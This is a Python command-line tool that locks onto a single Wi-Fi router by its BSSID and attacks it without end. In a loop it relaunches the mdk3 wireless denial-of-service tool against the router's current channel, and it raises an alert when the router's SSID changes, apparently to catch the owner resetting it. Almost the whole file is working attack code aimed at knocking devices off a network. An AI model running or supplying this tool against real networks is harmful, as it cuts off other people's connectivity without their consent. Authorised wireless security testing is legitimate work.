from __future__ import annotations

import threading
from typing import Any, NoReturn, Self, Union

import click
import playsound
from rich.traceback import install

from config import Config
from func import get_networks, kill, mdk3, notify, sleep
from logger import logger


class Target(object):

    def __init__(
        self: Self,
        interface: str,
        bssid: str,
        /,
        whitelist: Union[click.File, None] = None,
        blacklist: Union[click.File, None] = None,
        mode: int = 2,
        interval: int = 30,
        debug: bool = False,
    ) -> None:
        self.interface = interface
        self.bssid = bssid.lower()
        self.whitelist = whitelist
        self.blacklist = blacklist
        self.mode = mode
        self.interval = interval
        self.debug = debug

    def __setattr__(self, name: str, value: Any, /) -> None:
        return super().__setattr__(name, value)

    def __getattribute__(self, name: str, /) -> Any:
        try:
            return super().__getattribute__(name)
        except AttributeError as err:
            if self.debug:
                logger.error(err)

    def __repr__(self) -> str:
        return f"<{__name__}.Target BSSID={self.bssid!r} SSID={self.ssid!r} CHANNEL={self.channel!r} POWER={self.power!r} object at 0x{id(self):x}>"

    @property
    def bssid(self: Self) -> str:
        return self._bssid

    @bssid.setter
    def bssid(self: Self, value: str) -> None:
        self._bssid = value

    @property
    def channel(self) -> Union[int, None]:
        if hasattr(self, "_channel"):
            return self._channel

    @channel.setter
    def channel(self, ch):
        if self.channel and ch and self.channel != ch:
            notify(f"Target channel changed → CH {self.channel} → {ch}")

        self._channel = ch

    @property
    def ssid(self):
        if hasattr(self, "_ssid"):
            return self._ssid

    @ssid.setter
    def ssid(self, value):
        if self.ssid and value and self.ssid != value:
            notify("Target router SSID changed — reset suspected.")
            self.play()

        self._ssid = value

    def find(self: Self) -> int:
        networks = get_networks(self.interface)

        if network := networks.get(self.bssid):
            self.channel, self.ssid, self.power = network

            logger.info(
                _ := f"Target detected: SSID={self.ssid!r} BSSID={self.bssid!r} on channel {self.channel!r}"
            )
            notify(_)

            return 1

        self.ssid = self.power = self.channel = None

        logger.info(_ := "Target not detected.")
        notify(_)

        return 0

    def attack(self: Self) -> NoReturn:
        while True:
            kill("mdk3")

            if self.find():
                mdk3(
                    self.interface,
                    self.bssid,
                    self.channel,
                    self.mode,
                    self.whitelist,
                    self.blacklist,
                )
                sleep(self.interval)

                continue

            sleep(self.interval / 2, simple=True)

    def start(self: Self):
        pass

    def play(self: Self):
        if sound := Config.SOUND:
            threading.Thread(target=playsound.playsound, args=(sound,)).start()


@click.command()
@click.option("--bssid", type=str, required=True, help="Specify the target BSSID.")
@click.option(
    "--whitelist",
    type=click.File(),
    help="Read file containing MACs not to care about (Whitelist Mode).",
)
@click.option(
    "--blacklist",
    type=click.File(),
    help="Read file containing MACs to run tests on (Blacklist Mode).",
)
@click.option("--mode", type=int, default=2)
@click.option("--interval", type=int, default=60)
@click.option("--debug", is_flag=True, default=False)
@click.argument("interface")
def main(
    bssid: str,
    whitelist: click.File,
    blacklist: click.File,
    mode: int,
    interval: int,
    debug: bool,
    interface: str,
) -> None:
    if debug:
        pass

    target: Target = Target(
        interface,
        bssid,
        whitelist=whitelist,
        blacklist=blacklist,
        mode=mode,
        interval=interval,
        debug=debug,
    )

    target.attack()


if __name__ == "__main__":
    install()
    main()
